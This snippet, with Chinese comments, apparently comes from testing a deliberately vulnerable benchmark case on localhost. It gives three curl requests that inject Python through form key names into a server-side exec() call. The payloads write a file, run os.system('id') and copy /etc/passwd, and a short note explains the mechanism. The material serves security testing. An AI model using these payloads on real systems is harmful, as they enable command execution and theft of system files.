# 触发任意Python代码执行（写入文件）
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00425' \
  -d "open('/tmp/pwned','w').write('pwned')=BenchmarkTest00425"

# 触发远程命令执行（通过os.system，输出不返回但命令执行）
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00425' \
  -d "__import__('os').system('id > /tmp/out.txt')=BenchmarkTest00425"

# 读取敏感文件
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00425' \
  -d "open('/tmp/passwd','w').write(open('/etc/passwd').read())=BenchmarkTest00425"

原理：表单的 key 名就是要执行的 Python 代码，value 包含 "BenchmarkTest00425" 即可通过条件判断。服务端提取 key 名后还原并传入 exec()。